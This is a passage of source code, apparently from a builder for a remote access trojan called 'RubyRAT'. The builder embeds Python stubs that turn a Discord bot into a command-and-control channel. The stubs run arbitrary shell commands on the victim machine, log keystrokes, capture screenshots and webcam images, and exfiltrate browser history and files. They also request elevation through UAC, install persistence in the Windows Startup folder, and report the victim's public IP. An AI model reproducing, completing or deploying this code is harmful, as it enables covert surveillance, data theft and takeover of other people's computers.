deleted.\")\r\n        except Exception as e:\r\n            error_message = f\"Command execution failed: {str(e)}\"\r\n            print(error_message)\r\n            await ctx.send(\"Error: \" + error_message)\r\n\r\n@bot.command()\r\nasync def volume(ctx, volume_amount):\r\n    try:\r\n        if (program_isInstalled(\"C:\\\\users\\\\public\\\\nircmd.exe\")):\r\n            # Convert the volume_amount to an integer (0-100)\r\n            volume_amount = int(volume_amount)\r\n            if 0 <= volume_amount <= 100:\r\n                # Calculate the volume level based on 1% being 655\r\n                volume_level = volume_amount * 655\r\n                # Execute the nircmd command to set the system volume\r\n                subprocess.run([\"C:\\\\Github-Stuff\\\\nircmd\\\\nircmd.exe\", \"setsysvolume\", str(volume_level)])\r\n                await ctx.send(f\"Volume changed to {volume_amount}%.\")\r\n            else:\r\n                await ctx.send(\"Volume amount must be between 0 and 100.\")\r\n        else:\r\n            await ctx.send(\"NirCMD is not installed, installing it now!\")\r\n            print(\"NirCMD is not installed, installing it now!\")\r\n            installNirsoft(\"https://www.nirsoft.net/utils/nircmd.zip\", \"nircmd.exe\")\r\n            await ctx.send(\"Try running command again now...\")\r\n    except ValueError:\r\n         await ctx.send(\"Invalid volume amount. Please provide a number between 0 and 100.\")    \r\n    except Exception as e:\r\n        await ctx.send(f\"An error occurred: {e}\")\r\n\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    os.remove(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                if os.path.exists(exe_link_path):\r\n                    os.remove(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if is_admin():\r\n        return \"User has administrative privileges.\"\r\n    else:\r\n        return elevate_privileges()\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n\r\n\r\n\r\n\r\n# Function to generate a Fernet key from a password\r\ndef generate_key_from_password(password, salt=None):\r\n    if salt is None:\r\n        salt = os.urandom(16)\r\n    kdf = PBKDF2HMAC(\r\n        algorithm=hashes.SHA256(),\r\n        iterations=100000,  # You can adjust the number of iterations as needed\r\n        salt=salt,\r\n        length=32  # Length of the derived key\r\n    )\r\n    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))\r\n    return key, salt\r\n\r\n# Function to encrypt a file\r\ndef encrypt_file(input_file, password):\r\n    try:\r\n        key, salt = generate_key_from_password(password)\r\n        fernet = Fernet(key)\r\n        \r\n        with open(input_file, 'rb') as file:\r\n            file_data = file.read()\r\n        \r\n        encrypted_data = fernet.encrypt(file_data)\r\n        \r\n        # Use the same filename for the encrypted file\r\n        with open(input_file, 'wb') as encrypted_file:\r\n            encrypted_file.write(salt + encrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n# Function to decrypt a file\r\ndef decrypt_file(input_file, password):\r\n    try:\r\n        with open(input_file, 'rb') as encrypted_file:\r\n            salt = encrypted_file.read(16)  # Read the salt\r\n            encrypted_data = encrypted_file.read()\r\n        \r\n        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key\r\n        \r\n        fernet = Fernet(key)\r\n        decrypted_data = fernet.decrypt(encrypted_data)\r\n        \r\n        # Use the same filename for the decrypted file\r\n        with open(input_file, 'wb') as decrypted_file:\r\n            decrypted_file.write(decrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n@bot.command()\r\nasync def encrypt(ctx, input_file, password):\r\n    encrypted_file_name = encrypt_file(input_file, password)\r\n    await ctx.send(f'File encrypted and saved as {encrypted_file_name}')\r\n    return encrypted_file_name\r\n\r\n@bot.command()\r\nasync def decrypt(ctx, input_file, password):\r\n    decrypted_file_name = decrypt_file(input_file, password)\r\n    if decrypted_file_name != \"Invalid token (key or password)\":\r\n        await ctx.send(f'File decrypted and saved as {decrypted_file_name}')\r\n    else:\r\n        await ctx.send(decrypted_file_name)\r\n\r\n\r\n\r\n\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\ndef get_system_info():\r\n    try:\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence: {has_persistence()}\")\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        # Re-run the script with elevated privileges\r\n        ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        return \"Success! You should recive a new connection with a Elevated Client.\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n        sys.exit(1)\r\n\r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges.\")\r\n    else:\r\n        print(\"User does not have administrative privileges.\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    print(\"Trying to install on start...\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            }
            else if (selectedVersion == "1.6")
            {
                originalStub = "import discord\r\nimport os\r\nimport platform\r\nimport subprocess\r\nimport io\r\nimport psutil\r\nimport socket\r\nimport sys\r\nimport shutil\r\nimport hashlib\r\nimport base64\r\nimport ctypes\r\nimport asyncio\r\nimport zipfile\r\nimport importlib\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n\r\n# List of required modules and their corresponding import names\r\nrequired_modules = {\r\n    'discord': 'discord',\r\n    'pyautogui': 'pyautogui',\r\n    'pillow': 'PIL',\r\n    'opencv-python-headless': 'cv2',\r\n    'pynput': 'pynput',\r\n    'requests': 'requests',\r\n    'psutil': 'psutil',\r\n    'cryptography': 'cryptography',\r\n}\r\n\r\n# Additional required module\r\nmissing_modules = []\r\n\r\nfor module, import_name in required_modules.items():\r\n    try:\r\n        # Attempt to import the module\r\n        importlib.import_module(import_name)\r\n    except ImportError:\r\n        # Module is missing, add it to the missing_modules list\r\n        missing_modules.append(module)\r\n\r\n# Check and install required modules if needed\r\nif missing_modules:\r\n    missing_modules_str = \", \".join(missing_modules)\r\n    print(f\"Some required modules are missing: {missing_modules_str}\")\r\n    print(\"Installing missing modules...\")\r\n    try:\r\n        subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules_str.split(', '))\r\n        print(\"Modules installed successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while installing modules:\", e)\r\n        exit(1)\r\nelse:\r\n    print(\"All required modules are installed.\")\r\n\r\n\r\n    \r\nfrom discord.ext import commands\r\nimport requests\r\nimport pyautogui\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom pynput import keyboard\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom PIL import Image\r\nimport cv2\r\n\r\n# Settings for build\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\n\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\nis_logging = False\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    # Create encryption key\r\n    key = Fernet.generate_key()\r\n    global cipher_suite\r\n    cipher_suite = Fernet(key)\r\n\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n    category = discord.utils.get(guild.categories, name='RubyRAT')\r\n\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(system_username, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(system_username)\r\n\r\n    # Get the public IP address using an external service\r\n    public_ip = requests.get('https://api64.ipify.org?format=json').json()['ip']\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: **{public_ip}**. Client is **admin = {is_admin()}**. Also if you want to know more type **!help**\")\r\n\r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    help_message = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!history` - Gather and download all web history from client.\\n\"\r\n        \"`!volume <volume_procent>` - Changes volume to the given procentage.\\n\"\r\n        \"`!dump` - Sends a file containing the keyloggers log to C2.\\n\"\r\n        \"`!log` - Toggle keylogging.\\n\"\r\n        \"`!encrypt <filename> <password>` - Encrypt a file with a special password.\\n\"\r\n        \"`!decrypt <filename> <password>` - Decrypt a file with the special password.\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n    )\r\n    await ctx.send(help_message)\r\n\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot using pyautogui\r\n            screenshot = pyautogui.screenshot()\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            \r\n            # Remove the temporary file\r\n            os.remove(screenshot_path)\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def webcam(ctx):\r\n    global created_channel\r\n\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Initialize the webcam capture\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n\r\n            if cap.isOpened():\r\n                # Capture a single frame from the webcam\r\n                ret, frame = cap.read()\r\n\r\n                if ret:\r\n                    # Save the captured image to a file\r\n                    image_path = 'webcam_image.png'\r\n                    cv2.imwrite(image_path, frame)\r\n\r\n                    # Upload the image to Discord\r\n                    await ctx.send(file=discord.File(image_path))\r\n\r\n                    # Remove the temporary image file\r\n                    os.remove(image_path)\r\n\r\n                else:\r\n                    await ctx.send(\"Failed to capture image from webcam.\")\r\n            else:\r\n                await ctx.send(\"Webcam not available.\")\r\n\r\n            # Release the webcam\r\n            cap.release()\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\n\r\n\r\ndef toggle_logging():\r\n    global is_logging\r\n    if is_logging:\r\n        stop_logging()\r\n        is_logging = False\r\n    else:\r\n        start_logging()\r\n        is_logging = True\r\n\r\n# Create a variable to store the logged keys\r\nlogged_keys = []\r\n\r\ndef on_key_press(key):\r\n    try:\r\n        logged_key = key.char\r\n    except AttributeError:\r\n        if key == keyboard.Key.space:\r\n            logged_key = \" \"\r\n        else:\r\n            logged_key = f\"[{str(key)}]\"\r\n\r\n    logged_keys.append(logged_key)\r\n\r\ndef start_logging():\r\n    global logged_keys\r\n    logged_keys = []\r\n    listener = keyboard.Listener(on_press=on_key_press)\r\n    listener.start()\r\n    print(\"Logging started...\")\r\n\r\ndef stop_logging():\r\n    listener.stop()\r\n    with open(\"keylog.txt\", \"w\") as logfile:\r\n        logfile.write(\"\".join(logged_keys))\r\n    print(\"Logging stopped. Keys saved to 'keylog.txt'\")\r\n\r\n\r\n@bot.command()\r\nasync def log(ctx):\r\n    toggle_logging()\r\n    if (is_logging):\r\n        await ctx.send(\"Logging started. Use **!dump** to see logs\")\r\n        return \"Logging started.\"\r\n    else:\r\n        await ctx.send(\"Logging stopped. Use **!dump** to see logs\")\r\n        return \"Logging stopped.\"\r\n\r\n@bot.command()\r\nasync def dump(ctx):\r\n    if ctx.channel == created_channel:\r\n        global logged_keys\r\n        if logged_keys:\r\n            # Join the logged keys into a string\r\n            log_text = \"\".join(logged_keys)\r\n            # Send the logged keys as a file attachment\r\n            with open(\"keylog.txt\", \"w\") as logfile:\r\n                logfile.write(log_text)\r\n            await ctx.send(\"Here are the logged keys:\", file=discord.File(\"keylog.txt\"))\r\n            # Delete the logfile\r\n            os.remove(\"keylog.txt\")\r\n        else:\r\n            await ctx.send(\"No keys have been logged yet.\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\ndef installNirsoft(zip_file_url, exe_file_name):\r\n    # Destination path for the downloaded .zip file\r\n    zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n    # Directory where you want to extract the .exe file\r\n    extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n    \r\n    # Check if the .zip file already exists, and if not, download it\r\n    if not os.path.exists(zip_download_path):\r\n        try:\r\n            # Download the .zip file\r\n            response = requests.get(zip_file_url)\r\n            with open(zip_download_path, 'wb') as file:\r\n                file.write(response.content)\r\n            print(f\".zip File downloaded to {zip_download_path}\")\r\n        except Exception as e:\r\n            print(f\".zip File download failed: {str(e)}\")\r\n\r\n    # Extract the .exe file from the .zip archive\r\n    try:\r\n        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n            # Check if the .exe file exists in the archive\r\n            if exe_file_name in zip_ref.namelist():\r\n                zip_ref.extract(exe_file_name, extraction_directory)\r\n                exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                print(f\".exe File extracted to {exe_path}\")\r\n            else:\r\n                print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n    except Exception as e:\r\n        print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\ndef program_isInstalled(full_path_to_exe):\r\n    return os.path.exists(full_path_to_exe)\r\n\r\n\r\n@bot.command()\r\nasync def history(ctx):\r\n        # URL of the .zip file to download\r\n        zip_file_url = \"https://www.nirsoft.net/utils/browsinghistoryview.zip\"\r\n\r\n        # Destination path for the downloaded .zip file\r\n        zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n        # Directory where you want to extract the .exe file\r\n        extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n\r\n        # Command to execute after extracting the .exe file\r\n        command_to_execute = r'BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml \"C:\\Users\\Public\\history.html\"'\r\n\r\n        # Check if the .zip file already exists, and if not, download it\r\n        if not os.path.exists(zip_download_path):\r\n            try:\r\n                # Download the .zip file\r\n                response = requests.get(zip_file_url)\r\n                with open(zip_download_path, 'wb') as file:\r\n                    file.write(response.content)\r\n                await ctx.send(f\".zip File downloaded to {zip_download_path}\")\r\n                print(f\".zip File downloaded to {zip_download_path}\")\r\n            except Exception as e:\r\n                await ctx.send(f\".zip File download failed: {str(e)}\")\r\n                print(f\".zip File download failed: {str(e)}\")\r\n\r\n        # Extract the .exe file from the .zip archive\r\n        try:\r\n            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n                # Specify the name of the .exe file you want to extract\r\n                exe_file_name = \"BrowsingHistoryView.exe\"\r\n\r\n                # Check if the .exe file exists in the archive\r\n                if exe_file_name in zip_ref.namelist():\r\n                    zip_ref.extract(exe_file_name, extraction_directory)\r\n                    exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                    await ctx.send(f\".exe File extracted to {exe_path}\")\r\n                    print(f\".exe File extracted to {exe_path}\")\r\n                else:\r\n                    await ctx.send(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n                    print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"Extraction of .exe file failed: {str(e)}\")\r\n            print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\n        # Execute the command using the extracted .exe file\r\n        try:\r\n            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)\r\n            success_message = \"Command executed successfully.\"\r\n            print(success_message)\r\n            await ctx.send(success_message)\r\n\r\n            # Send file to C2\r\n            await ctx.send(\"Sent file to C2\", file=discord.File(extraction_directory + \"\\history.html\"))\r\n\r\n            # Delete the archive (.zip) and the extracted .exe file\r\n            os.remove(extraction_directory + \"\\\\history.html\")\r\n            os.remove(zip_download_path)\r\n            os.remove(exe_path)\r\n            print(f\".zip, .html and .exe files deleted.\")\r\n            await ctx.send(f\".zip, .html and .exe files deleted.\")\r\n        except Exception as e:\r\n            error_message = f\"Command execution failed: {str(e)}\"\r\n            print(error_message)\r\n            await ctx.send(\"Error: \" + error_message)\r\n\r\n@bot.command()\r\nasync def volume(ctx, volume_amount):\r\n    try:\r\n        if (program_isInstalled(\"C:\\\\users\\\\public\\\\nircmd.exe\")):\r\n            # Convert the volume_amount to an integer (0-100)\r\n            volume_amount = int(volume_amount)\r\n            if 0 <= volume_amount <= 100:\r\n                # Calculate the volume level based on 1% being 655\r\n                volume_level = volume_amount * 655\r\n                # Execute the nircmd command to set the system volume\r\n                subprocess.run([\"C:\\\\Github-Stuff\\\\nircmd\\\\nircmd.exe\", \"setsysvolume\", str(volume_level)])\r\n                await ctx.send(f\"Volume changed to {volume_amount}%.\")\r\n            else:\r\n                await ctx.send(\"Volume amount must be between 0 and 100.\")\r\n        else:\r\n            await ctx.send(\"NirCMD is not installed, installing it now!\")\r\n            print(\"NirCMD is not installed, installing it now!\")\r\n            installNirsoft(\"https://www.nirsoft.net/utils/nircmd.zip\", \"nircmd.exe\")\r\n            await ctx.send(\"Try running command again now...\")\r\n    except ValueError:\r\n         await ctx.send(\"Invalid volume amount. Please provide a number between 0 and 100.\")    \r\n    except Exception as e:\r\n        await ctx.send(f\"An error occurred: {e}\")\r\n\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if 